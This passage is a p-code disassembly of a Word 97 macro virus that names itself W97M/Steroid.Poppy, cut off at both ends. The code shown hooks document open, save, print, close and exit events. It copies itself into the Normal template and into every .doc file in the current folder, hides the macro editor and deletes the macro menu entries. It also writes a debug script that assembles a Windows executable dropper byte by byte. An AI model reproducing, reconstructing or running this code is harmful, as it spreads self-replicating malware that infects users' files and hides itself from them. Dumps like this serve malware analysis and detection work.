' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "c:\Anadrol.bat"
' 	ArgsCall (Call) Anadrol 0x0001 
' 	EndIf 
' Line #35:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #36:
' 	LitStr 0x0009 "VicodinES"
' 	MemStWith Author 
' Line #37:
' 	ArgsMemCallWith Execute 0x0000 
' Line #38:
' 	EndWith 
' Line #39:
' 	LitStr 0x000E "c:\startup.log"
' 	LitStr 0x0006 "Injekt"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #40:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #41:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Injekt"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #42:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #44:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Injekt"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #45:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #47:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #48:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\startup.log"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #49:
' 	EndWith 
' Line #50:
' 	EndWith 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #54:
' 	StartWithExpr 
' 	LitStr 0x000E "c:\startup.log"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #55:
' 	EndWith 
' Line #56:
' 	EndWith 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #59:
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #63:
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #64:
' 	QuoteRem 0x0000 0x000F "VMPCK v2.0 Beta"
' Line #65:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #66:
' 	Label fuckoff 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub HelpAbout())
' Line #69:
' 	OnError (Resume Next) 
' Line #70:
' 	LitStr 0x002E "Can I have a bottle of warm Diet Mountain Dew?"
' 	Ld vbInformation 
' 	LitStr 0x0021 "VMPCK v2.0 Beta / SR-1 Compatable"
' 	ArgsCall MsgBox 0x0003 
' Line #71:
' 	LitStr 0x0048 "Shout Out! ...Slage Hammer, Spanska and the entire _Kim_Liberation_Army_"
' 	Ld vbInformation 
' 	LitStr 0x0012 "W97M/Steroid.Poppy"
' 	ArgsCall MsgBox 0x0003 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub FileSave())
' Line #74:
' 	OnError (Resume Next) 
' Line #75:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #76:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #77:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #78:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #79:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub FileSaveAs())
' Line #82:
' 	OnError (Resume Next) 
' Line #83:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #84:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #85:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #86:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #87:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Sub FilePrint())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #92:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #93:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #94:
' 	EndSub 
' Line #95:
' 	FuncDefn (Sub FileClose())
' Line #96:
' 	OnError (Resume Next) 
' Line #97:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #98:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #99:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #100:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #101:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #102:
' 	EndSub 
' Line #103:
' 	FuncDefn (Sub FileExit())
' Line #104:
' 	OnError (Resume Next) 
' Line #105:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #106:
' 	ArgsCall (Call) Caffeine 0x0000 
' Line #107:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Sub AutoOpen())
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #112:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #113:
' 	EndSub 
' Line #114:
' 	FuncDefn (Sub AutoExit())
' Line #115:
' 	OnError (Resume Next) 
' Line #116:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #117:
' 	ArgsCall (Call) Caffeine 0x0000 
' Line #118:
' 	EndSub 
' Line #119:
' 	FuncDefn (Sub AutoClose())
' Line #120:
' 	OnError (Resume Next) 
' Line #121:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #122:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #123:
' 	EndSub 
' Line #124:
' 	FuncDefn (Sub ViewVBCode())
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Sub Caffeine())
' Line #129:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #130:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #131:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #132:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #133:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #134:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #135:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #136:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #137:
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #138:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #139:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #140:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #141:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #142:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #143:
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #144:
' 	ArgsCall (Call) Steroid 0x0000 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	Loop 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Sub Sustanon(strFile As String))
' Line #149:
' 	OnError (Resume Next) 
' Line #150:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #151:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #152:
' 	Ld Friend 
' 	St hFile 
' Line #153:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #154:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "N start.com"
' 	PrintItemNL 
' Line #155:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0100 4D 5A 50 00 02 00 00 00 04 00 0F 00 FF FF 00 00"
' 	PrintItemNL 
' Line #156:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0110 B8 00 00 00 00 00 00 00 40 00 1A 00 00 00 00 00"
' 	PrintItemNL 
' Line #157:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #158:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00"
' 	PrintItemNL 
' Line #159:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0140 BA 10 00 0E 1F B4 09 CD 21 B8 01 4C CD 21 90 90"
' 	PrintItemNL 
' Line #160:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0150 54 68 69 73 20 70 72 6F 67 72 61 6D 20 6D 75 73"
' 	PrintItemNL 
' Line #161:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0160 74 20 62 65 20 72 75 6E 20 75 6E 64 65 72 20 57"
' 	PrintItemNL 
' Line #162:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0170 69 6E 33 32 0D 0A 24 37 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #163:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #164:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #165:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #166:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #167:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #168:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #169:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #170:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #171:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0200 50 45 00 00 4C 01 04 00 4C 23 C0 52 00 00 00 00"
' 	PrintItemNL 
' Line #172:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0210 00 00 00 00 E0 00 8E 81 0B 01 02 19 00 02 00 00"
' 	PrintItemNL 
' Line #173:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0220 00 0A 00 00 00 00 00 00 00 10 00 00 00 10 00 00"
' 	PrintItemNL 
' Line #174:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0230 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00"
' 	PrintItemNL 
' Line #175:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0240 01 00 00 00 00 00 00 00 03 00 0A 00 00 00 00 00"
' 	PrintItemNL 
' Line #176:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0250 00 50 00 00 00 04 00 00 00 00 00 00 02 00 00 00"
' 	PrintItemNL 
' Line #177:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00"
' 	PrintItemNL 
' Line #178:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #179:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0280 00 30 00 00 54 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #180:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #181:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02A0 00 40 00 00 E0 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #182:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #183:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #184:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #185:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #186:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02F0 00 00 00 00 00 00 00 00 43 4F 44 45 00 00 00 00"
' 	PrintItemNL 
' Line #187:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0300 00 10 00 00 00 10 00 00 00 02 00 00 00 06 00 00"
' 	PrintItemNL 
' Line #188:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60"
' 	PrintItemNL 
' Line #189:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0320 44 41 54 41 00 00 00 00 00 10 00 00 00 20 00 00"
' 	PrintItemNL 
' Line #190:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0330 00 06 00 00 00 08 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #191:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0340 00 00 00 00 40 00 00 C0 2E 69 64 61 74 61 00 00"
' 	PrintItemNL 
' Line #192:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0350 00 10 00 00 00 30 00 00 00 02 00 00 00 0E 00 00"
' 	PrintItemNL 
' Line #193:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0"
' 	PrintItemNL 
' Line #194:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0370 2E 72 65 6C 6F 63 00 00 00 10 00 00 00 40 00 00"
' 	PrintItemNL 
' Line #195:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0380 00 02 00 00 00 10 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #196:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0390 00 00 00 00 40 00 00 50 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #197:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #198:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #199:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #200:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #201:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #202:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #203:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #204:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #205:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #206:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #207:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #208:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #209:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #210:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #211:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #212:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #213:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #214:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #215:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #216:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #217:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #218:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #219:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #220:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #221:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #222:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #223:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #224:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #225:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #226:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #227:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #228:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #229:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #230:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #231:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #232:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #233:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #234:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #235:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #236:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #237:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #238:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #239:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #240:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #241:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #242:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
